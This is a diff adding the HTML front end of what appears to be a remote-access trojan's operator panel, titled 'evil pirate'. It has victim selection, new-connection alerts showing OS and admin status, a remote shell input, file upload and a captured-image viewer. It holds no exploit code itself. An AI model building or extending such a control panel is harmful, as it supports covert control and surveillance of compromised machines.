@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>evil pirate - Login</title>
+  <!--icon-->
+  <link rel="icon" type="image/x-icon" href="icons/pirate.ico">
+  <!-- css-->
+  <link rel="stylesheet" href="styles/home.css">
+  <!--bootstrap-->
+  <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
+  <!--google fonts-->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@700&family=Reem+Kufi+Fun:wght@600&display=swap" rel="stylesheet">
+  <!--google icons-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+</head>
+<body>
+  <!--notification sound-->
+  <audio id="notificationSound" ><source src="sound/notification.mp3" type="audio/mp3" ></audio>
+  <!--menu-->
+  <div class="card topMenuCard" style="width: 18rem;">
+    <span class="material-symbols-outlined settings" id="settings" data-bs-toggle="modal" data-bs-target="#settingsModal">
+      manage_accounts
+      </span>
+  </div>
+  <!--target selector-->
+  <div class="card targetselectrorCard">
+    <div class="card-body targetselectrorCardBody">
+        <div class="form-group targetselectrorCardGroup">
+            <label for="targetSelector" 
+            class="targetTitle">Select Target : <span class="refreshButton" id="refreshButton"><span class="material-symbols-outlined">refresh</span></span></label>
+            <select class="form-control selector" id="targetSelector">
+              <option>None</option>
+            </select>
+          </div>
+          <span class="badge badge-dark ping" id="pingButton">Ping! 
+            <span class="spinner-border spinner-border-sm pingSpinner" id="pingSpinner" role="status"><span class="visually-hidden"  ></span></span>
+          </span><span class="badge badge-dark detailsButton" data-bs-toggle="collapse" data-bs-target="#targetDetailCollapse" aria-expanded="false" aria-controls="collapseExample">details</span>
+          <p class="selctedClient"> Selected : <span id="selectedUserText" class="selectedUserText">NONE </span> </p>
+        
+         
+          <div class="collapse" id="targetDetailCollapse">
+            <div class="card card-body targetDetails" id="targetDetails">
+              
+            </div>
+          </div>
+    </div> 
+</div>
+
+<!--ping alive modal-->
+<!-- Modal -->
+<div class="modal fade" id="pingStatusModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-body pingreplyModal">
+        <h1 class="pingStatusHeading" id="pingStatusHeading"></h1>
+        <p class="pingStatusDetail" id="pingStatusDetail"></p>
+        <button type="button" data-bs-dismiss="modal" class="btn btn-success pingStatusModalCloseButton">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!--new user connected modal-->
+<div class="modal fade" id="newUserConnection" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-body newUserConnectionModal">
+        <img src="images/hooray.png" class="card-img-top yayImage" alt="yayImage">
+        <h1 class="newConnectionHeading">Got A New Connection!</h1>
+        <div class="card newUserConnectionSubCard" style="width: 18rem;">
+          <div class="card-body">
+            <h5 class="card-title newUserConnectionID" id="newUserConnectionID">1234</h5>
+            <h6 class="card-subtitle mb-2  newUserConnectionOS" id="newUserConnectionOS">Windows </h6>
+            <span >ADMIN : <span id="NewTargetAdmin"> FALSE</span></span><br>
+                <span >TIME : <span id="NewTargetime"> 10:30</span></span><br>
+
+          </div>
+        </div>
+        <div class="input-group setNicknameMenu">
+          <input type="text" class="form-control nicknameInput" id="newTargetNicknameInput" placeholder="New Nickname" aria-label="Recipient's username" aria-describedby="basic-addon2">
+          <div class="input-group-append">
+            <button type="button" class="btn btn-warning" id="newTargetSetNicknameButton">Set</button>
+            <button type="button" data-bs-dismiss="modal" class="btn btn-danger" id="newTargetCloseModal">Close</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!--quick option selector-->
+<div class="card quickoptionCard">
+  <div class="card-body quickoptionCardBody">
+    
+    <div class="form-group quickoptionSelectorCard">
+      <label for="quickOptionSelector" 
+      class="targetTitle">Select option :</label>
+      <select class="form-control quickOptionSelector" id="quickOptionSelector">
+        <option>None</option>
+      </select>
+      
+      
+    </div>
+  </div>
+</div>
+<span class="badge badge-dark clearOutputButton " id="OutputclearButton">clear</span>
+<!--output-->
+      <textarea class="form-control output"  id="exampleFormControlTextarea1" rows="3" readonly>
+       
+      </textarea>
+
+<!--shell input-->
+<!--input shell-->
+<form id="fileForm">
+<div class="input-group shellInputMenu">
+  <input type="text" class="form-control shellInput" id="shellInput" placeholder="Shell command" aria-label="Recipient's username" aria-describedby="basic-addon2">
+  
+  <div class="input-group-append">
+    <label  class=" material-symbols-outlined uploadFileButton" id="uploadFileButton" for="uploadInput">add <input style="display: none;" type="file" id="uploadInput"/></label>
+    <span  class=" material-symbols-outlined inputclear" id="clearShellInput">close</span>
+  </div>
+  <button type="button"  class=" material-symbols-outlined sendButton" id="sendShellInput">send</button>
+</div>
+</form>
+
+
+
+
+<!--settings modal-->
+<!-- Modal -->
+<div class="modal fade" id="settingsModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content settingsModalContent">
+      <h1 class="settingsTitle">Settings</h1>
+      <div>Show Notifications  <span class="material-symbols-outlined toggleButtonNotification" id="toggleButtonNotification">
+        toggle_on
+        </span></div>
+        <div>allow Notification Sound  <span class="material-symbols-outlined toggleButtonSound" id="toggleButtonSound">
+          toggle_on
+          </span></div>
+          
+          <span class="badge badge-dark logButton" data-bs-toggle="collapse" data-bs-target="#logCollapse">View Logs</span>
+          <div class="collapse" id="logCollapse" >
+            <div class="card card-body logCollapseBody" id="logCollapseBody"  >
+              </div>
+          </div>
+    </div>
+  </div>
+  
+</div>
+
+<!--image capture viewer modal-->
+<!-- Modal -->
+<!-- Button trigger modal -->
+
+<div class="modal fade capturedImageVIewModal" id="capturedImageVIewModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      
+      <div class="modal-body capturedImageVIewModalBody">
+        <h6>From : <span id="imagefromAddress"></span></h6>
+        <img src="" class="capturedImage" id="capturedImage" alt="Girl in a jacket">
+        <button type="button" id="imageDownloadButton" class="btn btn-danger">Download</button>
+        <button type="button" class="btn btn-success" data-bs-dismiss="modal">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+  <!--socket script local-->
+  <script src="/socket.io/socket.io.js"></script>
+  <!--jquery local-->
+  <script src="jquery/jquery.js"></script>
+  <!--script-->
+  <script src="scripts/socket.js"></script>
+  <!--offline bootstrap js-->
+  <script src="bootstrap/js/bootstrap.min.js"></script>
+</body>
+</html>
